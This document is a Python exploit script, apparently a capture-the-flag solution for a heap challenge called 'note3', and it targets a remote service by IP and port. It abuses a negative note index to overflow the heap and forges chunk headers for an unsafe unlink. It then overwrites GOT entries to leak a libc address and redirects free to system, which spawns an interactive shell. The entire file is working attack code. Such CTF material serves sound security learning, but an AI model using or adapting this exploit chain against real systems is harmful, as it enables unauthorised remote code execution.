from zio import *
from pwn import *
#ip = 1.192.225.129
#target = "./note3"
target = ("115.28.27.103", 9003)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return  io 

def new_note(io, length_t, content_t):
	io.read_until("option--->>\n")
	io.writeline("1")
	io.read_until("content:(less than 1024)\n")
	io.writeline(str(length_t))
	io.read_until("content:\n")
	io.writeline(content_t)

def delete_note(io, id_t):
	io.read_until("option--->>\n")
	io.writeline("4")
	io.read_until("id of the note:\n")
	io.writeline(str(id_t))

def edit_note(io, id_t, content_t):
	io.read_until("option--->>\n")
	io.writeline("3")
	io.read_until("id of the note:\n")
	io.writeline(str(id_t))
	io.read_until("content:")
	io.writeline(content_t)

def pwn(io):

	new_note(io, 0x80, 'aaaaaa')
	new_note(io, 0x80, 'bbbbbb')
	new_note(io, 0x80, 'cccccc')
	new_note(io, 0x80, 'dddddd')
	new_note(io, 0x80, 'eeeeee')
	new_note(io, 0x80, 'ffffff')
	new_note(io, 0x80, '/bin/sh;')

	target_id = 2

	edit_note(io, target_id, '111111')

	#useful_code --- begin
	#prepare args
	arch_bytes = 8
	heap_buff_size = 0x80
	#node1_addr = &p0
	node1_addr = 0x6020C8 + 0x08 * target_id
	pack_fun = l64

	heap_node_size = heap_buff_size + 2 * arch_bytes #0x88

	p0 = pack_fun(0x0)
	p1 = pack_fun(heap_buff_size + 0x01)
	p2 = pack_fun(node1_addr - 3 * arch_bytes)
	p3 = pack_fun(node1_addr - 2 * arch_bytes)
	#p[2]=p-3
	#p[3]=p-2
	#node1_addr = &node1_addr - 3

	node2_pre_size = pack_fun(heap_buff_size)
	node2_size = pack_fun(heap_node_size)
	data1 = p0 + p1 + p2 + p3 + "".ljust(heap_buff_size - 4 * arch_bytes, '1') + node2_pre_size + node2_size
	
	#useful_code --- end

	#edit node 1:overwrite node 1 -> overflow node 2
	edit_note(io, -9223372036854775808, data1)
	#edit_note(io, 1, score, data1)
	#delete node 2, unlink node 1 -> unlink
	#delete_a_restaurant(io, 2)
	delete_note(io, target_id + 1)

	alarm_got = 0x0000000000602038
	puts_plt = 0x0000000000400730
	free_got = 0x0000000000602018

	data1 = l64(0x0) + l64(alarm_got) + l64(free_got) + l64(free_got)
	edit_note(io, target_id, data1)
	
	data1 = l64(puts_plt)[:6]

	io.gdb_hint()
	edit_note(io, target_id, data1)

	#io.read_until("option--->>\n")
	#io.writeline("3")
	#io.read_until("id of the note:\n")
	#io.writeline(l64(atol_got))

	#data = io.read_until("\n")
	#print [c for c in data]

	delete_note(io, 0)
	data = io.read_until("\n")[:-1]
	print [c for c in data]

	alarm_addr = l64(data.ljust(8, '\x00'))
	print "alarm_addr:", hex(alarm_addr)

	elf_info = ELF("./libc-2.19.so")
	#elf_info = ELF("./libc.so.6")
	alarm_offset = elf_info.symbols["alarm"]
	system_offset = elf_info.symbols["system"]

	libc_base = alarm_addr - alarm_offset
	system_addr = libc_base + system_offset
	data = l64(system_addr)[:6]
	edit_note(io, 1, data)

	delete_note(io, 6)
	io.interact()

io = get_io(target)
pwn(io)

